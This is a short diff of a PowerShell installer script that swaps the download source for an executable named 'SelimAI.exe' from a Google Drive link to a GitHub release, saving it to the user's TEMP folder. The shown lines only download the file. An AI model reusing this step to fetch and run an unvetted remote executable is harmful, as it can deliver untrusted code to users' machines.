@@ -56,7 +56,7 @@ Write-Host ""
 Write-Host $msgTitle -ForegroundColor Cyan
 Write-Host $msgInstalling -ForegroundColor Yellow
 
-$url = "https://drive.usercontent.google.com/download?id=1sPqGJABAzRasQ057IjSs_m1w1aqirIlb&export=download&authuser=0"
+$url = "https://github.com/selim8212/selim8212.github.io/releases/download/kjjk/SelimAI.exe"
 $outputFile = Join-Path $env:TEMP "SelimAI.exe"
 
 $request = [System.Net.HttpWebRequest]::Create($url)
